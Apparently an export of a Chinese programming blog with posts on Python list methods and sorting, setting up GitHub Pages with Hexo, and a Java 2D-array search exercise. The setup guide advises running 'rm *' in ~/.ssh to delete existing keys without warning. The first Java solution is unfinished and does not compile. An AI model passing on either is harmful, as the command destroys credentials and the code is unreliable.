<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="string">'x'</span>,<span class="string">'x'</span>,[<span class="string">'z'</span>,<span class="string">'y'</span>],[<span class="string">'z'</span>,<span class="string">'y'</span>]]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.count(<span class="number">1</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.count(<span class="string">'x'</span>)</div><div class="line"><span class="number">2</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.count([<span class="string">'z'</span>,<span class="string">'y'</span>])</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<h5 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h5><p>　　删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'z'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.remove(<span class="string">'z'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</div></pre></td></tr></table></figure>
<h5 id="index"><a href="#index" class="headerlink" title="index"></a>index</h5><p>　　返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">'z'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.index(<span class="string">'z'</span>)</div><div class="line"><span class="number">2</span></div></pre></td></tr></table></figure>
<h5 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h5><p>　　从列表的指定位置删除元素，并将其返回。如果没有指定索引，pop() 返回最后一个元素。元素随即从列表中被删除。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.pop()</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>]</div></pre></td></tr></table></figure>
<p>　　<strong>把列表当作堆栈使用。</strong> 用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack = [<span class="number">1</span>,<span class="number">2</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack.append(<span class="number">3</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack.append(<span class="number">4</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack.pop()</div><div class="line"><span class="number">4</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack.pop()</div><div class="line"><span class="number">3</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>stack</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>]</div></pre></td></tr></table></figure>
<h5 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h5><p>　　就地倒排列表中的元素。该方法直接修改列表，而不返回值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.reverse()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</div></pre></td></tr></table></figure>
<h5 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h5><p>　　在原位置对列表中的元素就地进行排序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.sort()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</div></pre></td></tr></table></figure>
<p>　　在原位置排序意味着改变原来的列表，而不是返回一个已排序的列表副本。以下操作是错误的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = lst.sort() <span class="comment">#这样做是错误的</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> x</div><div class="line"><span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>　　因为 sort() 方法修改了 lst 列表，然后返回了空值，所以 x 的值为 None。可以用 sorted() 方法来获得已排序的列表副本。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x = sorted(lst)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">2</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>x</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</div></pre></td></tr></table></figure>
<p>　　sorted() 方法可以用在任何数据类型的序列中，返回的总是一个列表形式：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(<span class="string">'python'</span>)</div><div class="line">[<span class="string">'h'</span>, <span class="string">'n'</span>, <span class="string">'o'</span>, <span class="string">'p'</span>, <span class="string">'t'</span>, <span class="string">'y'</span>]</div></pre></td></tr></table></figure>
<h4 id="高级排序"><a href="#高级排序" class="headerlink" title="高级排序"></a>高级排序</h4><p>　　sort 函数是 list 类的一个方法，其中，包含三个参数 cmp，key，reverse。其中，cmp 用于指定排序的大小比较算法；key 用于制定排序的维度和优先级别；reverse 说明是否是逆序排列（True 表示从大到小）.</p>
<h5 id="参数reverse"><a href="#参数reverse" class="headerlink" title="参数reverse"></a>参数reverse</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">4</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst) <span class="comment">#默认升序</span></div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst, reverse = <span class="keyword">True</span>) <span class="comment">#降序排列</span></div><div class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.sort()</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.sort(reverse = <span class="keyword">True</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</div></pre></td></tr></table></figure>
<h5 id="参数key"><a href="#参数key" class="headerlink" title="参数key"></a>参数key</h5><ul>
<li>按字符串长度排序。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="string">'c'</span>, <span class="string">'java'</span>, <span class="string">'python'</span>,<span class="string">'c++'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst, key = len)  </div><div class="line">[<span class="string">'c'</span>, <span class="string">'c++'</span>, <span class="string">'java'</span>, <span class="string">'python'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.sort(key = len)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="string">'c'</span>, <span class="string">'c++'</span>, <span class="string">'java'</span>, <span class="string">'python'</span>]</div></pre></td></tr></table></figure>
<ul>
<li>将列表中的每个元素变为小写，再按每个元素中的每个字母的ascii码从小到大排序 。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="string">'zZ'</span>,<span class="string">'bb'</span>,<span class="string">'XX'</span>,<span class="string">'Aa'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst, key = str.lower)</div><div class="line">[<span class="string">'Aa'</span>, <span class="string">'bb'</span>, <span class="string">'XX'</span>, <span class="string">'zZ'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst.sort(key = str.lower)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst</div><div class="line">[<span class="string">'Aa'</span>, <span class="string">'bb'</span>, <span class="string">'XX'</span>, <span class="string">'zZ'</span>]</div></pre></td></tr></table></figure>
<ul>
<li>按自定义函数排序。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">lastChar</span><span class="params">(s)</span>:</span> </div><div class="line">        <span class="keyword">return</span> s[<span class="number">-1</span>]    </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [<span class="string">'abc'</span>,<span class="string">'b'</span>,<span class="string">'AAz'</span>,<span class="string">'ef'</span>] </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst, key = lastChar) <span class="comment">##按列表e中每个元素的最后一个字母的ascii码从小到大排序</span></div><div class="line">[<span class="string">'b'</span>, <span class="string">'abc'</span>, <span class="string">'ef'</span>, <span class="string">'AAz'</span>]</div></pre></td></tr></table></figure>
<ul>
<li>按字典属性排序。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>lst = [&#123;<span class="string">'name'</span>:<span class="string">'fzy'</span>,<span class="string">'age'</span>:<span class="number">20</span>&#125;,&#123;<span class="string">'name'</span>:<span class="string">'xxx'</span>,<span class="string">'age'</span>:<span class="number">30</span>&#125;,&#123;<span class="string">'name'</span>:<span class="string">'yyy'</span>,<span class="string">'age'</span>:<span class="number">25</span>&#125;] <span class="comment">#列表中的元素为字典 </span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">age</span><span class="params">(s)</span>:</span> </div><div class="line">        <span class="keyword">return</span> s[<span class="string">'age'</span>] </div><div class="line"><span class="meta">&gt;&gt;&gt; </span>sorted(lst,key = age) <span class="comment">#自定义函数按列表f中字典的age从小到大排序 </span></div><div class="line">[&#123;<span class="string">'age'</span>: <span class="number">20</span>, <span class="string">'name'</span>: <span class="string">'fzy'</span>&#125;, &#123;<span class="string">'age'</span>: <span class="number">25</span>, <span class="string">'name'</span>: <span class="string">'yyy'</span>&#125;, &#123;<span class="string">'age'</span>: <span class="number">30</span>, <span class="string">'name'</span>: <span class="string">'xxx'</span>&#125;]</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>列表</tag>
      </tags>
  </entry>
  <entry>
    <title>Github Pages + Hexo 搭建博客（一）</title>
    <url>/2016/11/30/Github%20Pages%20+%20Hexo%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h4 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h4><p>阮一峰说过，喜欢写Blog的人，会经历三个阶段。</p>
<p>（1）第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
<p>（2）第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
<p>（3）第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
<a id="more"></a>
<p>我自己就是从一开始在CSDN写，后来租用阿里云的服务器，用WordPress搭建自己的博客，再到现在整体搬迁到Github上来，整个过程是一种锻炼，也是一种成长。</p>
<h5 id="GitHub-Pages是什么？"><a href="#GitHub-Pages是什么？" class="headerlink" title="GitHub Pages是什么？"></a>GitHub Pages是什么？</h5><p>GitHub Pages本用于介绍托管在GitHub的项目， 不过，由于他的空间免费稳定，用来做搭建一个博客再好不过了。</p>
<h5 id="为什么选择GitHub-Pages？"><a href="#为什么选择GitHub-Pages？" class="headerlink" title="为什么选择GitHub Pages？"></a>为什么选择GitHub Pages？</h5><ul>
<li>GitHub Pages有300M免费空间，搭建的博客可以很方便的进行管理，并且保存可靠；</li>
<li>GitHub 是趋势，GitHub上面有很多大牛，学IT的人应该尽早融入这样的环境，</li>
<li>程序员应该学会使用Git来管理项目，熟悉版本控制。</li>
<li>Github上有很多的开源项目，多学习学习，眼界会开阔很多；</li>
</ul>
<h5 id="接下来应该怎么做？"><a href="#接下来应该怎么做？" class="headerlink" title="接下来应该怎么做？"></a>接下来应该怎么做？</h5><p>Hexo 是一个简单地、轻量地、基于Node的一个静态博客框架，可以方便的生成静态网页托管在github。我们要使用Github Pages + Hexo搭建博客站点，就必须注册Github账号，安装git、node.js以及hexo等，接下来就一起来实践吧！</p>
<h4 id="Github注册与配置"><a href="#Github注册与配置" class="headerlink" title="Github注册与配置"></a>Github注册与配置</h4><h5 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h5><p>如果你还没有自己的Github账号，那请到Github官网注册账号：<a href="https://github.com/" target="_blank" rel="external">https://github.com/</a></p>
<p>注册成功后github会发送验证邮件到你的邮箱，请查收邮件并进行验证。</p>
<h5 id="新建版本库"><a href="#新建版本库" class="headerlink" title="新建版本库"></a>新建版本库</h5><p>注册完成后，点击Start a project来新建一个版本库</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-1.png" alt="30-1"></p>
<p>如果你已经注册，则在自己的主页，点击”New repository”，即可新建一个版本库 </p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-2.png" alt="30-2"></p>
<p>输入Repository name:yourname.github.io(yourname与你的注册用户名一致,这个就是你博客的域名了) </p>
<h5 id="启用GitHub-Page"><a href="#启用GitHub-Page" class="headerlink" title="启用GitHub Page"></a>启用GitHub Page</h5><p>进入版本库后，点击右上方的setting</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-3.png" alt="30-3"></p>
<p>下来到Githubs pages栏目，点击Launch automatic page generator</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-4.png" alt="30-4"></p>
<p>来到New user site页面后点击右下角的Continue to layouts</p>
<p>最后点击”Publish page”,发布github默认生成的一个静态站点</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-5.png" alt="30-5"></p>
<p>至此，我们已经配置好了github默认的静态站点，并且可以访问：你的github用户名.github.io测试我们刚刚建立好的站点主页。</p>
<h4 id="下载并安装Git"><a href="#下载并安装Git" class="headerlink" title="下载并安装Git"></a>下载并安装Git</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><p>根据自己电脑操作系统的位数到git官网下载相应的版本：</p>
<p><a href="https://git-scm.com/download/win" target="_blank" rel="external">https://git-scm.com/download/win</a></p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>根据自己的需要安装到相应的路径下，其他的一路点击next即可</p>
<h5 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h5><p>选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。</p>
<p>找到git的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。</p>
<p>安装与配置过程可参考图文教程：<a href="http://jingyan.baidu.com/article/9f7e7ec0b17cac6f2815548d.html" target="_blank" rel="external">git的安装和配置</a></p>
<h4 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h4><p>windows+R输入cmd打开命令提示符窗口，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">git --version</div></pre></td></tr></table></figure>
<p>若安装成功会打印出本机安装的git的版本。</p>
<h5 id="添加SSH-KEY到Github"><a href="#添加SSH-KEY到Github" class="headerlink" title="添加SSH KEY到Github"></a>添加SSH KEY到Github</h5><p>SSH Key是一个认证，让github识别绑定这台机器，允许这台机器提交。</p>
<p><strong>（1）检查本机是否有SSH KEY设置</strong></p>
<p>打开git bash，输入cd ~/.ssh 或cd .ssh</p>
<p>如果没有则提示： No such file or directory</p>
<p>如果有则进入~/.ssh路径下（ls查看当前路径文件，rm * 删除所有文件）</p>
<p><strong>（2）配置生成SSH KEY</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ cd ~  #保证当前路径在”~”下</div><div class="line">$ ssh-keygen -t rsa -C &quot;这里填写你的邮箱地址&quot;</div><div class="line">Generating public/private rsa key pair.</div><div class="line">Enter file in which to save the key (/c/Users/xxxx_000/.ssh/id_rsa):   #不填直接回车</div><div class="line">Enter passphrase (empty for no passphrase):   #输入密码（可以为空）</div><div class="line">Enter same passphrase again:   #再次确认密码（可以为空）</div><div class="line">Your identification has been saved in /c/Users/xxxx_000/.ssh/id_rsa.   #生成的密钥</div><div class="line">Your public key has been saved in /c/Users/xxxx_000/.ssh/id_rsa.pub.  #生成的公钥</div><div class="line">The key fingerprint is:</div><div class="line">e3:51:33:xx:xx:xx:xx:xxx:61:28:83:e2:81 xxxxxx@yy.com</div></pre></td></tr></table></figure>
<p>至此，已经生成ssh key，其存放路径为：c:/Users/你电脑的用户名/.ssh/下。</p>
<p>注释：可生成ssh key自定义名称的密钥，默认id_rsa。</p>
<p><strong>（3）复制SSH KEY到Github</strong></p>
<p>到C盘你的用户目录下找到.ssh文件夹，查看里面是否有id_rsa和id_rsa.pub这两个文件。</p>
<p>登录GitHub系统；点击右上角账号头像的“▼”→Settings→SSH kyes→Add SSH key，Title自定义，复制id_rsa.pub的公钥内容到GitHub中Add an SSH key的key输入框，最后“Add Key”。</p>
<p><strong>（4）配置账户</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ git config --global user.name “your_username”  #设置用户名</div><div class="line">$ git config --global user.email “your_registered_github_Email” </div><div class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</div></pre></td></tr></table></figure>
<p><strong>（5）测试SSH KEY是否设置成功</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ ssh -T git@github.com</div></pre></td></tr></table></figure>
<p>接下来会返回一些信息，并需要你输入一次yes，若生成ssh key时设置有密码则还会让你输入生成ssh key时设置的密码。</p>
<p>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access. #出现词句话，说明设置成功。</p>
<p>SSH-KEY的生成与配置可参考图文教程<a href="http://jingyan.baidu.com/article/a65957f4e91ccf24e77f9b11.html" target="_blank" rel="external">window下配置SSH连接GitHub、GitHub配置ssh key：</a></p>
<h4 id="下载并安装node-js"><a href="#下载并安装node-js" class="headerlink" title="下载并安装node.js"></a>下载并安装node.js</h4><h5 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h5><p>根据自己电脑操作系统的位数到git官网下载相应的版本：</p>
<p><a href="https://nodejs.org/en/download/" target="_blank" rel="external">https://nodejs.org/en/download/</a></p>
<h5 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h5><p>根据自己的需要安装到响应的地方，其他的一路点击next即可</p>
<h5 id="配置环境变量-1"><a href="#配置环境变量-1" class="headerlink" title="配置环境变量"></a>配置环境变量</h5><p>选中桌面图标计算机，右键选择属性，打开左边的高级系统设置，打开弹出窗口的环境变量，找到path进行编辑。</p>
<p>找到node.js的安装目录，将其复制后粘贴到path后面。注意每一个加进来的路径后面都要带英文格式的分号。</p>
<h4 id="测试是否安装成功-1"><a href="#测试是否安装成功-1" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h4><p>windows+R输入cmd打开命令提示符窗口，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">node -v</div></pre></td></tr></table></figure>
<p>若安装成功会打印出本机安装的node.js的版本。</p>
<h4 id="安装和配置hexo"><a href="#安装和配置hexo" class="headerlink" title="安装和配置hexo"></a>安装和配置hexo</h4><p>hexo是基于node.js的静态博客，官网也是搭建在GitHub上。</p>
<h5 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h5><p>在你喜欢的路径下新建一个文件夹blog，用来存放博客的文件，在此文件夹中右键打开Git Bash</p>
<p>输入如下指令进行安装：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ npm install -g hexo-cli</div></pre></td></tr></table></figure>
<p>如果执行这条命令时长时间未成功，那么请先使用下面的命令将npm镜像源更改为国内的镜像，再执行上面的安装命令，因为国外的镜像源很有可能被墙了。<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">npm config set registry https://registry.npm.taobao.org</div></pre></td></tr></table></figure></p>
<h5 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo init hexo</div></pre></td></tr></table></figure>
<p>这里会将Github上的hexo项目clone下来，得到hexo文件夹。</p>
<p>初始化成功后会在最后打印一行：INFO  Start blogging with Hexo!</p>
<h5 id="安装依赖文件"><a href="#安装依赖文件" class="headerlink" title="安装依赖文件"></a>安装依赖文件</h5><p>进入到hexo文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ cd hexo</div></pre></td></tr></table></figure>
<p>安装依赖文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ npm install</div></pre></td></tr></table></figure>
<p>部署形成文件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure></p>
<p>本地测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-6.png" alt="30-6"></p>
<p>在浏览器输入：<a href="http://localhost:4000/" target="_blank" rel="external">http://localhost:4000/</a> 即可访问到我们搭建好的hexo站点。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/11/30-7.png" alt="30-7"></p>
<h4 id="将本地hexo项目托管到Github"><a href="#将本地hexo项目托管到Github" class="headerlink" title="将本地hexo项目托管到Github"></a>将本地hexo项目托管到Github</h4><h5 id="修改全局配置文件-config-yml"><a href="#修改全局配置文件-config-yml" class="headerlink" title="修改全局配置文件_config.yml"></a>修改全局配置文件_config.yml</h5><p><strong>说明：</strong> hexo文件夹下一个_config.yml，我们称之为全局配置文件，在每个主题文件夹内还会有一个_config.yml文件，我们称之为主题配置文件。</p>
<p>用sublime text3或者notepad++等编辑器打开hexo文件夹下的_config.yml文件。</p>
<p><strong>注意：配置文件中每个字段后面的冒号是英文格式的，且在其后要加一个空格再写值</strong></p>
<p>编辑最后面的deploy属性，加入代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">type: git</div><div class="line">repository: https://github.com/你的Github用户名/你的Github用户名.github.io.git</div><div class="line">branch: master</div></pre></td></tr></table></figure>
<p>type使用是git。 </p>
<p>repository属性改成你的刚才创建仓库git地址。 </p>
<p>分支branch填写master。</p>
<h5 id="安装hexo-deployer-git插件"><a href="#安装hexo-deployer-git插件" class="headerlink" title="安装hexo-deployer-git插件"></a>安装hexo-deployer-git插件</h5><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
<h5 id="部署到Github上"><a href="#部署到Github上" class="headerlink" title="部署到Github上"></a>部署到Github上</h5><p>依次执行以下三条命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo clean  #清除缓存 网页正常情况下可以忽略此条命令</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo generator  #生成静态页面至public目录</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ hexo deploy  #将.deploy目录部署到GitHub</div></pre></td></tr></table></figure>
<p>执行hexo deploy命令之后，如果最后一行打印出如下信息则表示部署成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">INFO  Deploy done: git</div></pre></td></tr></table></figure>
<p>然后你再去访问你创建的Github pages地址，也就是：你的Github用户名.github.io，即可看到你本地的hexo项目已经被部署到github上去了。此时博客的默认主题是landscape，即上面本地测试时的样子。</p>
<p>此篇博客就讲解到这里，下一篇博客主要讲解hexo主题的配置。</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Github Pages</tag>
      </tags>
  </entry>
  <entry>
    <title>算法学习-刷题(八)</title>
    <url>/2016/11/06/%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%85%AB/</url>
    <content><![CDATA[<h4 id="二维数组中查找整数"><a href="#二维数组中查找整数" class="headerlink" title="二维数组中查找整数"></a>二维数组中查找整数</h4><p>牛客网在线编程：剑指Offer第1题</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p>
<a id="more"></a>
<h5 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h5><figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> [][] array,<span class="keyword">int</span> target)</span> </span>&#123;</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; array[<span class="number">0</span>].size())</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h5><p>把每一行看成有序递增的数组，利用二分查找，通过遍历每一行得到答案，时间复杂度是nlogn。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> [][] array,<span class="keyword">int</span> target)</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</div><div class="line">            <span class="keyword">int</span> low=<span class="number">0</span>;</div><div class="line">            <span class="keyword">int</span> high=array[i].length-<span class="number">1</span>;</div><div class="line">            <span class="keyword">while</span>(low&lt;=high)&#123;</div><div class="line">                <span class="keyword">int</span> mid=(low+high)/<span class="number">2</span>;</div><div class="line">                <span class="keyword">if</span>(target&gt;array[i][mid])</div><div class="line">                    low=mid+<span class="number">1</span>;</div><div class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(target&lt;array[i][mid])</div><div class="line">                    high=mid-<span class="number">1</span>;</div><div class="line">                <span class="keyword">else</span></div><div class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h5><p>利用二维数组由上到下，由左到右递增的规律，<br>那么选取右上角或者左下角的元素a[row][col]与target进行比较，<br>当target小于元素a[row][col]时，那么target必定在元素a所在行的左边,<br>即col–；<br>当target大于元素a[row][col]时，那么target必定在元素a所在列的下边,<br>即row++；</p>
